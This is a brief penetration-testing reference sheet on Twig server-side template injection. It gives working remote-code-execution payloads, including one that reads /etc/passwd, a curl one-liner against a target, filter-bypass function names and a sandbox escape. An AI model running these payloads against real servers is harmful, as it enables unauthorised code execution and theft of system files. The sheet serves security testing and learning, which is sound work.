# Server-Side Template Injection — Twig PHP

## 📌 What It Is
Twig template engine used in Symfony apps; user input rendered via `{{ }}` reaches sandbox. Achieves RCE via `_self` or filter functions.

## 🔍 How to Find It
Probe `{{7*7}}` returns 49. Probe `{{ ['id']|filter('system') }}` returns `id` output if RCE.

## 🧪 How to Test It
1. Confirm engine via output\n2. RCE payload: `{{['id']|map('system')|join}}`\n3. Read /etc/passwd: `{{['cat /etc/passwd']|map('system')|join}}`

## 💣 How to Exploit It
Read sensitive files, drop reverse shell.

## 🔄 Bypass Techniques
If `system` filtered → try `passthru`, `exec`, `shell_exec`, `popen`. If sandbox enabled → exploit `_self.env.registerUndefinedFilterCallback` (Twig <2.4.4).

## 🛠️ Tools
- tplmap, SSTImap

## 🎯 Payloads
See PAYLOADS/ssti_payloads_all_engines.md (Twig).

## 📝 Real-World Examples
Multiple Symfony / Drupal / WordPress plugin RCEs.

## 🚩 Common Mistakes / Traps
Don't confuse Twig with Jinja2 — same `{{ }}` syntax, different gadgets.

## 📊 Severity & Impact
Critical.

## 🔗 References
Twig docs, PortSwigger SSTI labs.

## ⚡ One-Liners
```bash\ncurl 'https://target/?n={{[%22id%22]|map(%22system%22)|join}}'\n```
